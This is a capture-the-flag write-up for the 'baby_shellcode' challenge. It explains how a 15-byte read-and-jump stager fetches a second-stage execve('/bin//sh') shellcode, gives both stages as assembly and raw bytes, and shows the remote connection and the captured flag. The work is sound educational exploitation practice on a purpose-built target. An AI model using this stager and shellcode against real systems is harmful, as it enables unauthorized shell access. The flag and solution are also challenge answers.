# Baby Shellcode writeup

## Task

We are given a binary called `baby_shellcode` and a remote service:

```text
nc 13.238.150.105 35679
```

The challenge description is minimal:

```text
what a wonderful shellcode
```

Flag format:

```text
THEM?!CTF{...}
```

## Initial analysis

The first useful step is checking strings and `checksec`.

Interesting strings:

```text
Welcome to baby_shellcode!
I'm generous, I will give you a tiny space for your shellcode stager.
Show me what you can do with 15 bytes!
```

There is also an anti-AI message in `.rodata`, but it has no effect on the actual exploit path.

`checksec` output:

- `Full RELRO`
- `NX enabled`
- `PIE enabled`
- `No Canary`
- `SHSTK & IBT`

At first, `NX enabled` looks odd for a shellcode challenge. However, the binary explicitly allocates an executable page with `mmap`, so ordinary stack NX is irrelevant here.

## Program behavior

The important part of `main` is:

```asm
1271:  mov r9d, 0
1277:  mov r8d, 0xffffffff
127d:  mov ecx, 0x22
1282:  mov edx, 0x7
1287:  mov esi, 0x1000
128c:  mov edi, 0
1291:  call mmap

12b7:  mov rax, [rbp-0x10]
12bb:  mov edx, 0xf
12c0:  mov rsi, rax
12c3:  mov edi, 0
12c8:  call read

12e8:  mov rax, [rbp-0x10]
12ec:  mov [rbp-0x8], rax
12f0:  mov rax, [rbp-0x10]
12f4:  mov rdx, [rbp-0x8]
12f8:  mov rdi, rax
12fb:  call *rdx
```

In pseudocode, this is basically:

```c
buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

read(0, buf, 0xf);
((void (*)())buf)();
```

So the challenge logic is:

1. allocate one `RWX` page,
2. read only `15` bytes into it,
3. immediately execute those bytes.

The challenge is not how to get execution, but how to do something useful with only `15` bytes.

## Exploitation idea

That means we need a `stager`:

- the first `15` bytes must perform another `read`,
- that second `read` must fetch a proper stage 2 shellcode,
- then stage 1 must jump to stage 2.

The standard way to solve this is:

1. inspect the register state before the indirect call,
2. reuse what the program has already prepared for us,
3. spend the tiny byte budget only on the minimum logic needed to extend the payload.

## Register state at shellcode entry

Right before `call *rdx`, the binary sets up very useful register values:

- `rdi = buf`
- `rdx = buf`
- `rax = buf`

During debugging it also turns out that `rsi` still points to `buf`.

That means we do not need to discover the executable mapping ourselves; the pointer is already in registers.

A debugger snapshot right before entering the shellcode looked like this:

```text
rax = 0x7ffff7fb8000
rdi = 0x7ffff7fb8000
rsi = 0x7ffff7fb8000
rdx = 0x7ffff7fb8000
```

So all the important pointers are already available.

## The naive first stager and why it fails

The obvious first attempt is:

```asm
xor edi, edi
xor eax, eax
syscall
jmp rsi
```

The idea is straightforward:

- `rax = 0` for `read`,
- `rdi = 0` for `stdin`,
- `rsi` already points at the buffer,
- `jmp rsi` transfers control to the newly read bytes.

Unfortunately, this does not work for two separate reasons.

### Problem 1. The second `read` overwrites the stager itself

If stage 2 is read back into the start of the page, the incoming bytes overwrite stage 1 before stage 1 has fully finished executing.

So the second `read` cannot target `buf`. It must target `buf + 0xf`, i.e. immediately after the first 15 bytes.

### Problem 2. `rdx` is not a valid read length

It is tempting to assume that `rdx` still contains `0xf` from the first `read`, but that is no longer true by the time control reaches the shellcode:

```asm
12f4: mov rdx, [rbp-0x8]
```

And `[rbp-0x8]` is just `buf`.

So at shellcode entry:

- `rdx = buf`,

not:

- `rdx = 0xf`.

If we invoke `syscall` with that value, the kernel sees something like:

```c
read(0, buf + 0xf, huge_address)
```

In debugging, this returned:

```text
rax = 0xfffffffffffffff2
```

That is `-14`, i.e. `EFAULT`.

## Final stage 1 stager

Once both problems are accounted for, the correct first stage is:

```asm
lea rsi, [rsi+0xf]
push 0x7f
pop rdx
xor edi, edi
xor eax, eax
syscall
jmp rsi
```

Raw bytes:

```text
48 8d 76 0f 6a 7f 5a 31 ff 31 c0 0f 05 ff e6
```

Byte count:

- `lea rsi, [rsi+0xf]` = 4 bytes
- `push 0x7f` = 2 bytes
- `pop rdx` = 1 byte
- `xor edi, edi` = 2 bytes
- `xor eax, eax` = 2 bytes
- `syscall` = 2 bytes
- `jmp rsi` = 2 bytes

Total: exactly `15` bytes.

### What this stager does

1. `lea rsi, [rsi+0xf]`
   Moves the destination pointer past stage 1 so the next `read` does not destroy currently executing code.

2. `push 0x7f ; pop rdx`
   Sets a sane size for the second `read` without wasting bytes on a larger immediate load.
   `0x7f` is just a convenient small value that is large enough for stage 2 plus a few commands afterward.

3. `xor edi, edi`
   Sets `stdin`.

4. `xor eax, eax`
   Sets syscall number `0` for `read`.

5. `syscall`
   Performs `read(0, buf + 0xf, 0x7f)`.

6. `jmp rsi`
   Jumps directly to the newly received stage 2 shellcode.

## Stage 2 shellcode

Once the size limit is gone, we can use a standard compact `execve("/bin//sh", 0, 0)` shellcode for `x86_64`.

I used:

```asm
xor rsi, rsi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
mov rdi, rsp
xor rdx, rdx
mov al, 0x3b
syscall
```

Bytes:

```text
48 31 f6
56
48 bb 2f 62 69 6e 2f 2f 73 68
53
48 89 e7
48 31 d2
b0 3b
0f 05
```

That is enough to spawn a shell cleanly.

## Full payload

The final payload sent to the socket is:

```text
[15-byte stager][stage2 execve shellcode]
```

Concretely:

```text
48 8d 76 0f 6a 7f 5a 31 ff 31 c0 0f 05 ff e6
48 31 f6 56 48 bb 2f 62 69 6e 2f 2f 73 68 53 48 89 e7 48 31 d2 b0 3b 0f 05
```

After the shell is spawned, we can just send normal shell commands:

```sh
pwd
ls -la
cat /home/ctf/flag.txt
```

## Local validation

Before attacking the remote service, it is useful to verify locally that the shell actually comes up.

A simple test is:

1. run the binary,
2. send the payload,
3. then send:

```sh
echo PWNED
exit
```

If `PWNED` appears in the output, then:

- stage 1 successfully fetched stage 2,
- `execve("/bin//sh")` worked,
- the subsequent input is now being processed by the spawned shell.

That is exactly how the exploit was validated locally.

## Remote exploitation

Connecting to the service:

```text
nc 13.238.150.105 35679
```

we first receive:

```text
Welcome to baby_shellcode!
I'm generous, I will give you a tiny space for your shellcode stager.
Show me what you can do with 15 bytes!
```

After sending the payload and then:

```sh
cat /home/ctf/flag.txt
```

the service returns:

```text
THEM?!CTF{th1s_sh3llc0d3_wr1t1ng_1s_v3ry_v3ry_34sy_t0_d0}
```

## Why this challenge is nice

Even though this is a baby-level task, it teaches several very good habits:

- `RWX + call buf` alone is not the full story,
- register state at shellcode entry matters a lot,
- a stager can accidentally overwrite itself,
- it is important to validate not only the destination pointer but also the length for the next `read`.

So the challenge is small, but it is a very clean exercise in writing a tiny meaningful stager rather than blindly pasting shellcode.

## Final result

The whole exploit reduces to two ideas:

1. fit stage 1 into exactly `15` bytes,
2. use it only to fetch and jump to stage 2.

Final stager:

```asm
lea rsi, [rsi+0xf]
push 0x7f
pop rdx
xor edi, edi
xor eax, eax
syscall
jmp rsi
```

Flag:

```text
THEM?!CTF{th1s_sh3llc0d3_wr1t1ng_1s_v3ry_v3ry_34sy_t0_d0}
```
